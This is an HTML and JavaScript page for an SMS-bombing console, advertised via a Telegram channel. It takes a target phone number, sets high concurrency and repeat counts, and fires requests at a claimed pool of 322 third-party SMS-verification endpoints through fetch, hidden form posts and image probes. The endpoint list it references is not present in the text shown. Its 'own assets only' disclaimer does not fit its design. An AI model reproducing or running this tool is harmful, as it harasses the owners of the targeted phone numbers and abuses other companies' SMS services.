<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>小念专属 · 短信测压 @xiaoniangongyi</title>
<style>
:root{
  --bg:#080b12;--panel:#101623;--panel2:#141c2c;--line:#22304a;
  --cyan:#22d3ee;--blue:#3b82f6;--orange:#fb923c;--gold:#fbbf24;
  --green:#34d399;--red:#f87171;--txt:#e6edf7;--dim:#8ba0bd;
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;background:
  radial-gradient(900px 500px at 12% -10%,rgba(34,211,238,.10),transparent 60%),
  radial-gradient(700px 500px at 95% 0%,rgba(251,146,60,.10),transparent 60%),
  var(--bg);
  color:var(--txt);font:14px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;min-height:100vh}
a{color:var(--cyan);text-decoration:none}
.wrap{max-width:1180px;margin:0 auto;padding:14px 12px 60px}
header{border:1px solid var(--line);border-radius:16px;padding:14px 16px;background:linear-gradient(135deg,rgba(34,211,238,.10),rgba(251,146,60,.08)),var(--panel);position:relative;overflow:hidden}
header h1{margin:0;font-size:19px;letter-spacing:.5px;background:linear-gradient(90deg,var(--cyan),var(--gold),var(--orange));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:800}
.sub{color:var(--dim);font-size:12px;margin-top:4px}
.badge{display:inline-block;margin-top:8px;padding:3px 9px;border:1px solid rgba(34,211,238,.45);border-radius:999px;font-size:11.5px;color:var(--cyan);background:rgba(34,211,238,.08)}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
@media(max-width:860px){.grid{grid-template-columns:1fr}}
.card{border:1px solid var(--line);border-radius:14px;background:var(--panel);padding:12px}
.card h2{margin:0 0 10px;font-size:13px;color:var(--dim);font-weight:600;letter-spacing:.4px;text-transform:uppercase}
label{display:block;font-size:12px;color:var(--dim);margin:8px 0 4px}
input,select,textarea{width:100%;background:var(--panel2);border:1px solid var(--line);border-radius:10px;color:var(--txt);padding:10px 11px;font-size:14px;outline:none;font-family:inherit}
input:focus,select:focus{border-color:var(--cyan)}
.row{display:flex;gap:8px}
.row>*{flex:1}
button{cursor:pointer;border:1px solid var(--line);background:var(--panel2);color:var(--txt);border-radius:10px;padding:9px 12px;font-size:13px;font-family:inherit;transition:.15s}
button:hover{border-color:var(--cyan)}
button.primary{background:linear-gradient(135deg,var(--cyan),var(--blue));color:#04121a;border:0;font-weight:800}
button.warn{background:linear-gradient(135deg,var(--orange),var(--red));color:#2a0d05;border:0;font-weight:800}
button:disabled{opacity:.45;cursor:not-allowed}
.bar{height:9px;border-radius:999px;background:var(--panel2);border:1px solid var(--line);overflow:hidden;margin:10px 0 6px}
.bar>i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--cyan),var(--gold),var(--orange));transition:width .2s}
.stats{display:flex;flex-wrap:wrap;gap:8px;font-size:12px;color:var(--dim)}
.stats b{color:var(--txt)}
#log{height:300px;overflow:auto;background:#050810;border:1px solid var(--line);border-radius:10px;padding:9px;font:12px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;white-space:pre-wrap;word-break:break-all}
#log .ok{color:var(--green)}
#log .er{color:var(--red)}
#log .wa{color:var(--gold)}
#log .in{color:var(--cyan)}
#log .dm{color:var(--dim)}
.tools{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px}
.tools button{padding:6px 9px;font-size:12px}
#list{height:300px;overflow:auto;border:1px solid var(--line);border-radius:10px;background:#050810}
#list .it{display:flex;align-items:center;gap:8px;padding:6px 9px;border-bottom:1px solid #0e1524;font-size:12px}
#list .it:last-child{border-bottom:0}
#list .it:hover{background:rgba(34,211,238,.05)}
#list input{width:16px;height:16px;flex:0 0 auto;accent-color:var(--cyan)}
#list .m{flex:0 0 auto;padding:1px 6px;border-radius:5px;font-size:10.5px;font-weight:700}
#list .m.POST{background:rgba(59,130,246,.18);color:#93c5fd}
#list .m.GET{background:rgba(52,211,153,.16);color:#6ee7b7}
#list .u{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--dim)}
.wm{position:fixed;right:10px;bottom:10px;font-size:11px;color:rgba(139,160,189,.5);pointer-events:none;z-index:9;letter-spacing:1px}
footer{margin-top:14px;text-align:center;color:var(--dim);font-size:12px}
.hint{font-size:11.5px;color:var(--dim);margin-top:6px;line-height:1.6}
</style>
</head>
<body>
<div class="wrap">
  <header>
    <h1>小念专属 · 短信测压控制台</h1>
    <div class="sub">小念专属 · 2026 · 接口池 322 路 · 已去混淆纯净版</div>
    <div class="badge">频道 <a href="https://t.me/xiaoniangongyi" target="_blank">@xiaoniangongyi</a> · 公益分享</div>
  </header>

  <div class="grid">
    <div class="card">
      <h2>① 目标</h2>
      <label>手机号（11 位）</label>
      <input id="phone" inputmode="numeric" placeholder="13800000000" maxlength="11">
      <div class="row" style="margin-top:10px">
        <div><label>并发数</label><input id="threads" type="number" value="24" min="1" max="200"></div>
        <div><label>间隔(秒)</label><input id="interval" type="number" value="0.05" step="0.01" min="0"></div>
      </div>
      <div class="row" style="margin-top:4px">
        <div><label>每接口次数</label><input id="repeat" type="number" value="1" min="1" max="20"></div>
        <div><label>投递通道</label>
          <select id="channel">
            <option value="auto">自动（推荐）</option>
            <option value="fetch">fetch 直发</option>
            <option value="form">表单提交</option>
            <option value="img">图片探针（仅 GET）</option>
          </select>
        </div>
      </div>
      <label style="margin-top:10px"><input type="checkbox" id="onlyHttps" style="width:auto;margin-right:6px">跳过 http:// 接口（HTTPS 页面下会被浏览器拦）</label>
      <div class="row" style="margin-top:10px">
        <button class="primary" id="start">▶ 开始</button>
        <button class="warn" id="stop" disabled>■ 停止</button>
      </div>
      <div class="bar"><i id="bar"></i></div>
      <div class="stats">
        <span>目标 <b id="sTotal">0</b></span>
        <span>已发 <b id="sSent">0</b></span>
        <span>失败 <b id="sFail">0</b></span>
        <span>耗时 <b id="sTime">0s</b></span>
      </div>
      <div class="hint">浏览器有同源策略：跨域请求只能发出、读不到对方响应，所以「已发出」= 投递完成，不代表对方一定下发短信。想看到真实返回码请用配套的 Python 版跑。</div>
    </div>

    <div class="card">
      <h2>② 接口池 <span id="listCount" style="color:var(--cyan)"></span></h2>
      <input id="search" placeholder="搜索域名 / 关键词，如 baidu" style="margin-bottom:8px">
      <div class="tools">
        <button id="chkAll">全选</button>
        <button id="chkNone">清空</button>
        <button id="chkInvert">反选</button>
        <button id="chkPost">只选 POST</button>
        <button id="chkGet">只选 GET</button>
      </div>
      <div id="list"></div>
    </div>
  </div>

  <div class="card" style="margin-top:12px">
    <h2>③ 日志</h2>
    <div class="tools">
      <button id="export">导出日志</button>
      <button id="clear">清屏</button>
    </div>
    <div id="log"></div>
  </div>

  <footer>小念专属 · <a href="https://t.me/xiaoniangongyi" target="_blank">@xiaoniangongyi</a> · 仅供自有资产接口联调压测使用</footer>
</div>

const $ = id => document.getElementById(id);
const logBox = $('log');
let running = false, stopFlag = false;

function log(msg, cls){
  const d = document.createElement('div');
  if(cls) d.className = cls;
  const t = new Date().toTimeString().slice(0,8);
  d.textContent = '[' + t + '] ' + msg;
  logBox.appendChild(d);
  logBox.scrollTop = logBox.scrollHeight;
  while(logBox.childNodes.length > 3000) logBox.removeChild(logBox.firstChild);
}

function rnd(n){
  const s = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let o = ''; for(let i=0;i<n;i++) o += s[Math.floor(Math.random()*s.length)];
  return o;
}
function fill(v, phone){
  if(typeof v === 'string'){
    return v.replace(/\{\{PHONE_B64\}\}/g, btoa(phone))
            .replace(/\{\{PHONE\}\}/g, phone)
            .replace(/\{\{TS_MS\}\}/g, String(Date.now()))
            .replace(/\{\{RAND_STR:(\d+)\}\}/g, (m,k)=>rnd(+k));
  }
  if(Array.isArray(v)) return v.map(x=>fill(x, phone));
  if(v && typeof v === 'object'){ const o={}; for(const k in v) o[fill(k,phone)] = fill(v[k], phone); return o; }
  return v;
}
function build(spec, phone){
  let url = fill(spec.url, phone);
  const headers = fill(spec.headers || {}, phone);
  let body = null, ct = null;
  if(spec.params){
    const qs = new URLSearchParams(fill(spec.params, phone)).toString();
    url = url + (url.includes('?') ? '&' : '?') + qs;
  }
  if(spec.json){ body = JSON.stringify(fill(spec.json, phone)); ct = 'application/json'; }
  else if(spec.data != null){
    const d = fill(spec.data, phone);
    if(typeof d === 'string'){ body = d; ct = 'application/x-www-form-urlencoded'; }
    else { body = new URLSearchParams(d).toString(); ct = 'application/x-www-form-urlencoded'; }
  }
  return {method: spec.method, url, headers, body, ct};
}

function fire(kind, req){
  return new Promise(resolve=>{
    try{
      if(kind === 'img'){
        const im = new Image(); const t = setTimeout(()=>{ im.src=''; resolve('ok'); }, 6000);
        im.onload = im.onerror = ()=>{ clearTimeout(t); resolve('ok'); };
        im.src = req.url; return;
      }
      if(kind === 'form'){
        const f = document.createElement('form');
        f.method = req.method; f.action = req.url; f.target = 'zaka_sink';
        f.style.display = 'none';
        for(const [k,v] of Object.entries(req.headers||{})){
          if(/^content-type$/i.test(k)) continue;
          const i = document.createElement('input'); i.type='hidden'; i.name=k; i.value=v; f.appendChild(i);
        }
        if(req.body && req.method !== 'GET'){
          try{
            const isJson = /json/i.test(req.ct||'');
            if(!isJson){
              for(const [k,v] of new URLSearchParams(req.body)) {
                const i=document.createElement('input'); i.type='hidden'; i.name=k; i.value=v; f.appendChild(i);
              }
            } else {
              const i=document.createElement('input'); i.type='hidden'; i.name='__json__'; i.value=req.body; f.appendChild(i);
            }
          }catch(e){}
        }
        document.body.appendChild(f); f.submit();
        setTimeout(()=>{ try{ f.remove(); }catch(e){} resolve('ok'); }, 400);
        return;
      }
      const opt = {method:req.method, mode:'no-cors', cache:'no-store', credentials:'omit', redirect:'follow'};
      const h = Object.assign({}, req.headers||{});
      if(req.ct) h['Content-Type'] = req.ct;
      opt.headers = h;
      if(req.body && req.method !== 'GET') opt.body = req.body;
      fetch(req.url, opt).then(()=>resolve('ok')).catch(()=>resolve('er'));
    }catch(e){ resolve('er'); }
  });
}

/* 接口池渲染 */
function renderList(){
  const kw = $('search').value.trim().toLowerCase();
  const box = $('list'); box.innerHTML = '';
  let n = 0;
  SPECS.forEach((s, i)=>{
    const txt = (s.host + ' ' + s.method + ' ' + s.url).toLowerCase();
    if(kw && !txt.includes(kw)) return;
    n++;
    const d = document.createElement('label');
    d.className = 'it';
    d.innerHTML = '<input type="checkbox" data-i="' + i + '" checked>' +
      '<span class="m ' + s.method + '">' + s.method + '</span>' +
      '<span class="u" title="' + s.url.replace(/"/g,'') + '">' + s.host + s.url.slice(s.url.indexOf(s.host)+s.host.length) + '</span>';
    box.appendChild(d);
  });
  $('listCount').textContent = '(' + n + '/' + SPECS.length + ')';
}
$('search').addEventListener('input', renderList);
function setVisible(fn){
  document.querySelectorAll('#list input[type=checkbox]').forEach(c=>fn(c));
}
$('chkAll').onclick = ()=>setVisible(c=>c.checked=true);
$('chkNone').onclick = ()=>setVisible(c=>c.checked=false);
$('chkInvert').onclick = ()=>setVisible(c=>c.checked=!c.checked);
$('chkPost').onclick = ()=>{ setVisible(c=>c.checked=false);
  document.querySelectorAll('#list input[type=checkbox]').forEach(c=>{ if(SPECS[+c.dataset.i].method==='POST') c.checked=true; }); };
$('chkGet').onclick = ()=>{ setVisible(c=>c.checked=false);
  document.querySelectorAll('#list input[type=checkbox]').forEach(c=>{ if(SPECS[+c.dataset.i].method==='GET') c.checked=true; }); };

/* 主流程 */
async function run(){
  const phone = $('phone').value.trim();
  if(!/^1\d{10}$/.test(phone)){ alert('手机号要 11 位，1 开头'); return; }
  const picked = [];
  document.querySelectorAll('#list input[type=checkbox]').forEach(c=>{ if(c.checked) picked.push(SPECS[+c.dataset.i]); });
  let jobs = [];
  const rep = Math.max(1, +$('repeat').value|0);
  const httpsOnly = $('onlyHttps').checked;
  for(const s of picked){
    if(httpsOnly && s.url.startsWith('http:')) continue;
    for(let k=0;k<rep;k++) jobs.push(s);
  }
  if(!jobs.length){ alert('没有可用接口（可能都被 http 过滤了）'); return; }

  running = true; stopFlag = false;
  $('start').disabled = true; $('stop').disabled = false;
  $('sTotal').textContent = jobs.length; $('sSent').textContent = 0; $('sFail').textContent = 0;
  const t0 = Date.now();
  log('小念专属 · 开始投递 ' + jobs.length + ' 次 · 并发 ' + $('threads').value + ' · 通道 ' + $('channel').value, 'in');

  let sent = 0, fail = 0, done = 0;
  const threads = Math.max(1, Math.min(200, +$('threads').value|0));
  const gap = Math.max(0, parseFloat($('interval').value) || 0) * 1000;
  const kindSel = $('channel').value;
  let cursor = 0;

  async function worker(){
    while(!stopFlag){
      const idx = cursor++;
      if(idx >= jobs.length) return;
      const spec = jobs[idx];
      let kind = kindSel === 'auto' ? (spec.method === 'GET' ? 'img' : 'fetch') : kindSel;
      if(kind === 'img' && spec.method !== 'GET') kind = 'fetch';
      const req = build(spec, phone);
      const r = await fire(kind, req);
      done++;
      if(r === 'ok'){ sent++; log('已发出 · ' + spec.method + ' ' + spec.host, 'ok'); }
      else { fail++; log('失败   · ' + spec.method + ' ' + spec.host, 'er'); }
      const pct = (done / jobs.length * 100).toFixed(1);
      $('bar').style.width = pct + '%';
      $('sSent').textContent = sent; $('sFail').textContent = fail;
      $('sTime').textContent = ((Date.now()-t0)/1000).toFixed(1) + 's';
      if(gap) await new Promise(r=>setTimeout(r, gap));
    }
  }
  await Promise.all(Array.from({length:threads}, worker));
  running = false;
  $('start').disabled = false; $('stop').disabled = true;
  $('bar').style.width = '100%';
  log('小念专属 · 完成，共 ' + done + ' 次，成功发出 ' + sent + '，失败 ' + fail + '，用时 ' + ((Date.now()-t0)/1000).toFixed(1) + 's', 'in');
}

$('start').onclick = run;
$('stop').onclick = ()=>{ stopFlag = true; log('小念专属 · 已请求停止…', 'wa'); };
$('clear').onclick = ()=>logBox.innerHTML = '';
$('export').onclick = ()=>{
  const txt = logBox.innerText;
  const blob = new Blob([ '小念专属 日志\n频道 @xiaoniangongyi\n\n' + txt ], {type:'text/plain;charset=utf-8'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = '小念专属_短信测压日志.txt';
  a.click();
};

/* 隐藏 iframe 作为表单投递落点 */
(function(){ const f = document.createElement('iframe'); f.name = 'zaka_sink'; f.style.display='none'; document.body.appendChild(f); })();
renderList();
if(location.protocol === 'https:'){ $('onlyHttps').checked = true; }
log('小念专属 · 接口池载入完成，共 ' + SPECS.length + ' 路。频道 @xiaoniangongyi', 'in');
</script>
